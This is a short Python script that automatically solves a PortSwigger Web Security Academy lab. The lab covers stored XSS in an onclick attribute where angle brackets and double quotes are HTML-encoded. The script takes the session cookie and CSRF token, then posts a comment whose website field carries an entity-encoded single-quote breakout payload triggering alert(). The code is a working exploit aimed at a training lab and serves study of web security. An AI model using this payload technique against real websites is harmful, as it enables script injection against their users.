import requests
import argparse
import re
import webbrowser as wb
from time import sleep

parser = argparse.ArgumentParser(description='Solves the following Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped')
parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
lab = parser.parse_args()

r = requests.get("https://" + lab.id + ".web-security-academy.net/post/?postId=1")
cookie = {'Cookie':f"session={r.cookies.get('session')}"}
csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
data={'csrf':csrf,'postId':'1','comment':'XSS','name':'Stored XSS','email':'xss@xss.com', 'website':"http://xss.com&apos;);alert(&apos;XSS"}

r = requests.post("https://" + lab.id + ".web-security-academy.net/post/comment", headers=cookie, data=data, allow_redirects=False)
wb.open("https://" + lab.id + ".web-security-academy.net/post?postId=1")

sleep(5)

try:
    assert('<p>Solved</p>' in requests.get("https://" + lab.id + ".web-security-academy.net/").text)
    print('Lab solved.')
except Exception:
    print("Error while trying to solve the lab.")
